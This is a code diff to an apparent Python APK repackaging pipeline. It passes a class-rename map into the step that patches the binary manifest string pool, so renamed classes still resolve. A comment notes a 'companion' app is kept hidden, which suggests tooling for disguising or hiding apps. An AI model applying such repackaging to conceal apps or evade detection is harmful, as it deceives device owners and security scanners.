@@ -1862,7 +1862,7 @@ def _patch_axml_version(manifest_raw: bytes, ver_code: int, ver_name: str) -> by
     return bytes(result)
 
 
-def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None):
+def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_rename_map=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
 
     OLD = OLD_PKG.encode()
@@ -1914,6 +1914,53 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None):
         print("[X] No strings replaced in manifest (package name)")
         sys.exit(1)
     print(f"  Manifest: {replaced} pkg replacements (category.INFO preserved — companion stays hidden)")
+
+    # CRITICAL: Replace old class names with renamed equivalents in manifest string pool
+    # step_6a renames classes in smali/DEX but manifest still has original names
+    # (e.g. App, MainActivity, Firebase) → Android can't find them → ClassNotFoundException
+    if class_rename_map:
+        class_replaced = 0
+        new_str_data2 = bytearray()
+        new_offsets2  = []
+        pos2 = 0
+        temp = bytes(new_str_data)
+        while pos2 < len(temp):
+            if pos2 + 2 > len(temp): break
+            cc2 = temp[pos2]; bc2 = temp[pos2+1]
+            if pos2 + 2 + bc2 + 1 > len(temp): break
+            ch2 = temp[pos2+2:pos2+2+bc2]
+            new_offsets2.append(len(new_str_data2))
+            try:
+                s = ch2.decode("utf-8")
+            except Exception:
+                new_str_data2.extend([cc2, bc2]); new_str_data2.extend(ch2); new_str_data2.append(0)
+                pos2 += 2 + bc2 + 1; continue
+
+            replaced_class = False
+            for orig_class, new_class in class_rename_map.items():
+                base_orig = orig_class.split("$")[0]
+                base_new  = new_class.split("$")[0]
+                if s == new_pkg + "." + base_orig:
+                    full_new = new_pkg + "." + base_new
+                    enc = full_new.encode("utf-8")
+                    cl  = len(full_new); bl = len(enc)
+                    new_str_data2.append(cl if cl <= 127 else ((cl>>8)|0x80))
+                    if cl > 127: new_str_data2.append(cl&0xFF)
+                    new_str_data2.append(bl if bl <= 127 else ((bl>>8)|0x80))
+                    if bl > 127: new_str_data2.append(bl&0xFF)
+                    new_str_data2.extend(enc); new_str_data2.append(0)
+                    class_replaced += 1; replaced_class = True; break
+
+            if not replaced_class:
+                new_str_data2.extend([cc2, bc2]); new_str_data2.extend(ch2); new_str_data2.append(0)
+            pos2 += 2 + bc2 + 1
+
+        if class_replaced > 0:
+            new_str_data = new_str_data2
+            new_offsets  = new_offsets2
+            print(f"  Manifest: {class_replaced} class name(s) updated to match renamed smali")
+        else:
+            print(f"  Manifest: no class renames needed")
 
     # 4-byte align new_str_data — Android AXML requires all chunks 4-byte aligned
     while len(new_str_data) % 4 != 0:
@@ -2630,7 +2677,7 @@ def main():
         new_dex = f.read()
 
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", APK_ASSET):
-        step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None)
+        step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_rename_map=class_rename_map)
 
     with track("PHASE_1", "STEP_9A", "Patch versionCode + versionName in binary AXML manifest [Step 9A]", APK_ASSET):
         # Read assembled APK manifest, patch version, write back
